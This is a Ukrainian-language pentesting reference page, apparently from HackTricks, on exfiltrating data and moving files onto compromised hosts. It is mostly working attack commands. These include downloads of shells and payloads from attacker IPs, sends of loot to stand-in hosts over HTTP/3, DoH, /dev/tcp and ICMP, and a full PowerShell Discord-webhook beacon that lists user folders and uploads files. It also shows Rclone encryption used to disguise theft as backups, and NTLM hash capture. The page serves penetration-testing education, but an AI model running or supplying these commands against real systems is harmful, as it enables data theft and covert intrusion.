# Ексфільтрація

> [!TIP]
> Щоб переглянути наскрізний приклад підготовки loot у `C:\Users\Public` та його exfiltration за допомогою Rclone для імітації легітимних резервних копій, ознайомтеся з наведеним нижче workflow.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Поширені домени, додані до whitelist, для exfiltration інформації

Перейдіть на [https://lots-project.com/](https://lots-project.com/), щоб знайти поширені домени, додані до whitelist, які можна використовувати зловмисно

## Копіювання\&вставлення Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Завантаження файлів

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Модуль Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS-сервер**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
### HTTP/3 / QUIC

Якщо правила egress налаштовані на перевірку класичного **TCP/443**, але дозволяють **UDP/443**, примусове використання **HTTP/3** може перевести передачу в **QUIC** замість TLS поверх TCP. Кінцева точка зловмисника повинна мати вбудовану підтримку HTTP/3 (наприклад, reverse proxy або endpoint для upload, який уже оголошує `Alt-Svc: h3`).
```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```
У дослідницькій роботі 2025 року (QUIC-Exfil) встановлено, що зашифровані заголовки QUIC і динамічні зміни адрес можуть ускладнювати виявлення exfiltration на рівні firewall порівняно з каналами на основі TLS або DNS; також було продемонстровано метод server-preferred-address, який маскує exfiltration під міграцію з’єднання на стороні сервера.<sup>[[9]](#references)</sup>

### Завантаження об’єктів у pre-signed / delegated object-storage

Якщо ви можете створити або отримати короткоживучий **signed URL**, жертві потрібен лише звичайний HTTPS-клієнт. Це дає змогу не встановлювати cloud SDK і не зберігати на хості довгоживучі облікові дані.<sup>[[8]](#references)</sup> Це також може виглядати як звичайний трафік object-storage.

**Linux / macOS (AWS S3 pre-signed `PUT`)**
```bash
curl -X PUT -T loot.7z \
-H 'Content-Type: application/octet-stream' \
'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```
**Windows PowerShell (AWS S3 попередньо підписаний `PUT`)**
```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
-ContentType 'application/octet-stream' `
-Uri $presignedUrl
```
**Azure Blob SAS URL**
```bash
curl -X PUT --data-binary @loot.7z \
-H 'x-ms-blob-type: BlockBlob' \
-H 'Content-Type: application/octet-stream' \
'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```
Notes:
- Pre-signed URLs / SAS tokens зазвичай обмежують **path**, **HTTP method** і **expiration**.<sup>[[8]](#references)[[10]](#references)</sup>
- Для Azure Blob `Put Blob` параметр `x-ms-blob-type: BlockBlob` є обов’язковим.<sup>[[10]](#references)</sup>
- Цей підхід добре працює з `curl`, `Invoke-WebRequest` або будь-яким custom implant, здатним виконувати необроблений HTTPS `PUT`.

### goshs

[goshs](https://github.com/patrickhener/goshs) — це single-binary заміна для `python3 -m http.server`.<sup>[[4]](#references)</sup>
Він підтримує upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links і функції OOB collaboration (DNS, SMTP, захоплення NTLM hash).<sup>[[4]](#references)</sup>
```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```
## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration

Webhooks — це HTTPS endpoints, доступні лише для запису, які приймають JSON і необов'язкові частини файлів. Їх зазвичай дозволено для довірених SaaS-доменів, і вони не потребують OAuth/API keys, що робить їх корисними для beaconing та exfiltration із мінімальними перешкодами.<sup>[[5]](#references)[[6]](#references)</sup>

Основні ідеї:
- Endpoint: Discord використовує https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data із частиною з назвою payload_json, що містить {"content":"..."}, і необов'язковими частинами файлів із назвами file.
- Шаблон циклу оператора: періодичний beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK підтверджує доставку.

PowerShell PoC (Discord):
```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
param([string]$Text)
$payload = @{ content = $Text } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
param([string]$Path, [string]$Name)
if (-not (Test-Path $Path)) { return }
$bytes = [System.IO.File]::ReadAllBytes($Path)
$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$mp.Add($fileContent, "file", $Name)
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
$ctr++
# Beacon
$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
Send-DiscordText -Text $beacon

# Every 2nd: quick folder listing
if ($ctr % 2 -eq 0) {
$dirs = @("Documents","Desktop","Downloads","Pictures")
$acc = foreach ($d in $dirs) {
$p = Join-Path $env:USERPROFILE $d
$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
}
Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
}

# Every 3rd: targeted exfil
if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

# Every 4th: basic recon
if ($ctr % 4 -eq 0) {
$who = whoami
$ip  = ipconfig | Out-String
$tmp = Join-Path $env:TEMP "recon.txt"
"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
Send-DiscordFile -Path $tmp -Name "recon.txt"
}

Start-Sleep -Seconds 20
}
```
Notes:
- Подібні patterns застосовуються до інших collaboration platforms (Slack/Teams), що використовують їхні incoming webhooks; відповідно змініть URL і JSON schema.
- Для DFIR артефактів кешу Discord Desktop і відновлення webhook/API див. пов’язану сторінку нижче.<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone (exfiltration із cloud/object-storage)

Сучасні operators часто **staging-ять loot локально**, а потім використовують [Rclone](https://rclone.org/), щоб transfer виглядав як звичайне backup- або sync-завдання. Практичний pattern:

1. Звичайний remote (`s3`, `webdav`, `drive`, `mega`, ...)
2. Обгортка `crypt`, щоб **contents і filenames шифрувалися client-side**
3. Необов’язкова обгортка `chunker`, якщо provider встановлює обмеження на розмір object або ви хочете менші upload units
```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
--transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```
Нотатки:
- `crypt` може шифрувати як вміст файлів, так і їхні назви.<sup>[[3]](#references)</sup>
- `chunker` прозоро розділяє великі файли на частини та повторно об’єднує їх під час download.<sup>[[11]](#references)</sup>
- `rclone.conf` зберігає secrets `crypt` в **obscured** формі, яка не забезпечує надійного захисту даних у стані спокою.<sup>[[3]](#references)</sup> Для короткотривалих операцій віддавайте перевагу спеціальному тимчасовому config і видаляйте його після завершення. Якщо його потрібно зберігати довше, використовуйте encrypted config handling (`RCLONE_CONFIG_PASS` / `--password-command`) замість зберігання звичайного `rclone.conf` на диску.<sup>[[11]](#references)</sup>
- Якщо target уже синхронізує **OneDrive**, **Google Drive** або **Dropbox**, копіювання loot у synchronized directory може скористатися вже схваленим клієнтом замість розгортання нового transfer binary.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP server (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP-сервер (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP-сервер (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** клієнт
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali як сервер
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Або створіть SMB-шару **за допомогою samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
Windows
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
### goshs
[goshs](https://github.com/patrickhener/goshs) — це однобінарна альтернатива, яка надає файли через SMB і захоплює NTLM-хеші клієнтів, що підключаються.<sup>[[4]](#references)</sup>
```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```
## SCP

Атакувальник повинен мати запущений SSHd.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Якщо на жертві є SSH, атакер може змонтувати директорію з жертви на атакері.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Завантаження файлу з жертви
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Завантаження файлу на машину жертви
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
дякуємо **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## DNS over HTTPS (DoH)

Якщо класичний DNS через UDP/53 створює багато шуму або заблокований, але вихідний HTTPS загалом дозволений, звичайний патерн exfiltration через DNS-мітки можна загорнути в запити **DoH** до публічного resolver. Зберігайте кожну мітку значно меншою за ліміт DNS у 63 байти та використовуйте безпечний для DNS алфавіт, наприклад Base32.
```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
nl -nrz -w4 -s. | while read chunk; do
curl --http2 -s \
-H 'accept: application/dns-json' \
"https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
>/dev/null
done
```
На authoritative DNS server для `exf.attacker.tld` відсортуйте запити за числовим префіксом і відновіть потік Base32. Це зберігає transport усередині HTTPS до resolver замість класичного DNS через UDP/53.<sup>[[2]](#references)</sup>

Для повноцінного двонапрямленого DNS tunnel tooling (`iodine`, `dnscat2` тощо) перегляньте [сторінку про tunneling](tunneling-and-port-forwarding.md).

## **SMTP**

Якщо ви можете надсилати дані на SMTP server, ви можете створити SMTP для отримання даних за допомогою python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
### goshs

[goshs](https://github.com/patrickhener/goshs) може швидко запустити SMTP server для перехоплення email callback під час сценаріїв OOB exfiltration.<sup>[[4]](#references)</sup>
```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```
Отримані електронні листи та callbacks відображаються безпосередньо у виводі термінала.
Може бути поєднано із DNS callback server для повного OOB-покриття:
```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```
## TFTP

За замовчуванням у XP і 2003 (в інших системах його потрібно явно додати під час інсталяції)

У Kali, **запустіть TFTP-сервер**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**TFTP-сервер на Python:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
На **victim** підключіться до Kali server:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Завантажити файл за допомогою PHP oneliner:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Жертва**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Програма `debug.exe` не лише дає змогу перевіряти бінарні файли, а й має **можливість відновлювати їх із hex**. Це означає, що, надавши hex-код бінарного файлу, `debug.exe` може згенерувати файл. Однак важливо зазначити, що debug.exe має **обмеження на складання файлів розміром до 64 КБ**.<sup>[[1]](#references)</sup>
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Потім скопіюйте та вставте текст у windows-shell, після чого буде створено файл із назвою nc.exe.

## References

- [1] [Передавання файлів до Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS — DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Backend `crypt` у Rclone](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord як C2 і кешовані залишкові дані](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Вебхуки Discord — виконання вебхука](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Forensic Suite (парсер кешу)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Завантаження об’єктів за допомогою попередньо підписаних URL-адрес — Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: використання функції Server Preferred Address у QUIC для здійснення атак із витоку даних](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob (REST API) — Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Документація Rclone](https://rclone.org/docs/#configuration-encryption)
{{#include ../banners/hacktricks-training.md}}
